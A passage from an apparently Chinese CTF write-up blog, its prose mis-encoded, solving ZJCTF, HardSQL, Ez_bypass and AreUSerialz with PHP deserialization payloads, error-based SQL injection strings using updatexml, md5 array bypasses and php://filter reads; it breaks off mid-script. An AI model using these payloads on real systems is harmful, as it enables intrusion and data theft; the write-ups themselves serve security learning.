class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>ä»è¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ° Flagä¼šè¾“å‡ºflag.phpé¡µé¢çš„å†…å®¹ å› æ­¤æˆ‘ä»¬å°è¯•ç¼–å†™ååºåˆ—åŒ–è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨phpåœ¨çº¿å·¥å…·è¿è¡Œä»¥ä¸Šè„šæœ¬å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; <br></code></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æŠŠä¸‰æ®µpayloadéƒ½ç”¨&amp;è¿åœ¨ä¸€èµ· å› ä¸ºé¡µé¢è¦åŒæ—¶GETè¿™ä¸‰ä¸ªå‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; <br></code></pre></td></tr></table></figure>

<p>è¿›å…¥ç•Œé¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># welcome to the zjctf<br><br><br><br>oh u find it  <br><br>U R SO CLOSE !///COME ON PLZ<br></code></pre></td></tr></table></figure>

<p>æ—¢ç„¶å·²ç»æ‰¾åˆ° æˆ‘ä»¬æŸ¥çœ‹é¡µé¢æºä»£ç  å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;19510b2e-c5ec-4d58-8ac3-45f405715b64&#125;<br></code></pre></td></tr></table></figure>

<h3 id="13ã€-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#13ã€-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="13ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>13ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h3><p>å°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç  æ— æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>

<p>åˆ™å°è¯•ä½¿ç”¨fuzzè·å–å¯ä»¥ä½¿ç”¨çš„å…³é”®è¯</p>
<p>ä½¿ç”¨burpsuiteæŠ“åŒ… ç”¨inturder fuzzä¸€ä¸‹ çŸ¥é“äº†å…·ä½“å“ªäº›å¯ä»¥ä½¿ç”¨ å“ªäº›ä¸å¯ä»¥ä½¿ç”¨</p>
<p>&#x3D;ä¸å¯ä½¿ç”¨ ä½†æ˜¯likeå¯ä»¥ä½¿ç”¨ å¯ä»¥å°†ä¸‡èƒ½å¯†ç ä¿®æ”¹ä¸º å› ä¸º((a)like(b))ç­‰ä»·äºa&#x3D;b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;or((1)like(1))#<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸç™»å½•</p>
<p>å‘ç°1%201ä¸å¯ä½¿ç”¨ é‚£ä¹ˆè¿‡æ»¤äº†ç©ºæ ¼ æƒ³åˆ°æŠ¥é”™æ³¨å…¥</p>
<p>æŠ¥é”™æ³¨å…¥æœ‰ä¸¤ç§å‡½æ•°å¯ä»¥é€‰æ‹©updatexml()å‡½æ•°å’Œextractvalue()å‡½æ•°</p>
<p>è¿™é‡Œå°è¯•ä½¿ç”¨updatexmlå‡½æ•°</p>
<p>çˆ†å‡ºæ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></code></pre></td></tr></table></figure>

<p>è·å–åˆ°åº“åä¸ºgeek</p>
<p>æŸ¥è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br></code></pre></td></tr></table></figure>

<p>è·å–è¡¨åä¸ºH4rDsq1</p>
<p>æŸ¥å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))#</span><br></code></pre></td></tr></table></figure>

<p>è·å–å­—æ®µåä¸ºâ€™<del>id,username,password</del>â€˜</p>
<p>æŸ¥æ‰¾å­—æ®µå†…å®¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,password))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure>

<p>è·å–éƒ¨åˆ†Â â€˜<del>flag</del>flag{0f70795b-4266-461e-96â€™</p>
<p>ä½¿ç”¨rightçªç ´é™åˆ¶</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure>

<p>è·å–å‰©ä½™éƒ¨åˆ†â€™<del>6-461e-96d7-e1a4c490a2c0}</del>â€˜</p>
<h3 id="14ã€-MRCTF2020-Ez-bypass"><a href="#14ã€-MRCTF2020-Ez-bypass" class="headerlink" title="14ã€[MRCTF2020]Ez_bypass"></a>14ã€[MRCTF2020]Ez_bypass</h3><p>æ‰“å¼€ç»™å‡ºçš„é¡µé¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">I put something in F12 for you<br>include &#x27;flag.php&#x27;;<br>$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;<br>if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;<br>    $id=$_GET[&#x27;id&#x27;];<br>    $gg=$_GET[&#x27;gg&#x27;];<br>    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<br>        echo &#x27;You got the first step&#x27;;<br>        if(isset($_POST[&#x27;passwd&#x27;])) &#123;<br>            $passwd=$_POST[&#x27;passwd&#x27;];<br>            if (!is_numeric($passwd))<br>            &#123;<br>                 if($passwd==1234567)<br>                 &#123;<br>                     echo &#x27;Good Job!&#x27;;<br>                     highlight_file(&#x27;flag.php&#x27;);<br>                     die(&#x27;By Retr_0&#x27;);<br>                 &#125;<br>                 else<br>                 &#123;<br>                     echo &quot;can you think twice??&quot;;<br>                 &#125;<br>            &#125;<br>            else&#123;<br>                echo &#x27;You can not get it !&#x27;;<br>            &#125;<br><br>        &#125;<br>        else&#123;<br>            die(&#x27;only one way to get the flag&#x27;);<br>        &#125;<br>&#125;<br>    else &#123;<br>        echo &quot;You are not a real hacker!&quot;;<br>    &#125;<br>&#125;<br>else&#123;<br>    die(&#x27;Please input first&#x27;);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºæ¥ç¬¬ä¸€æ­¥æ˜¯ä¼ ä¸¤ä¸ªå‚æ•° ggå’Œid è¦æ±‚è¿™ä¸¤ä¸ªå˜é‡å€¼ä¸ç›¸ç­‰ ä½†æ˜¯md5å€¼ç›¸ç­‰ å³æ‰¾ä¸€ç»„md5çš„ç¢°æ’ æˆ–è€…ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡ è¿™é‡Œä½¿ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡<br>å› ä¸ºæ˜¯getè·å–å‚æ•° å› æ­¤å¯ä»¥ç›´æ¥åœ¨urlä¸­ä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id[]=1&amp;gg[]=2<br></code></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">You got the first steponly one way to get the flag<br></code></pre></td></tr></table></figure>

<p>è¯æ˜åˆ°äº†ç¬¬äºŒæ­¥</p>
<p>è¦æ±‚ä½¿ç”¨postæ–¹æ³•ä¼ å…¥passwdå‚æ•° ä¸èƒ½æ˜¯æ•°å­— ä½†æ˜¯è¦å’Œ1234567ç›¸ç­‰</p>
<p>å¯¹äºphpçš„&#x3D;&#x3D;å¼±æ¯”è¾ƒ å…ˆç­‰é•¿ å†æ¯”è¾ƒ åˆ™åªè¦1234567a å³å¯è®©passwdæ—¢ä¸æ˜¯æ•°å­— è¿˜èƒ½æ»¡è¶³å¼±æ¯”è¾ƒçš„è¦æ±‚</p>
<p>postä¼ å‚åå¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;75b3015e-b845-4afa-b6da-6199276733d8&#125;<br></code></pre></td></tr></table></figure>

<h3 id="15ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#15ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="15ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>15ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h3><p>æ‰“å¼€ä¹‹åæ˜¯ç½‘é¡µçš„æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>payloadå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-comment">// $this-&gt;process();</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-comment">// $this-&gt;process();</span><br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$A</span>=<span class="hljs-keyword">new</span> <span 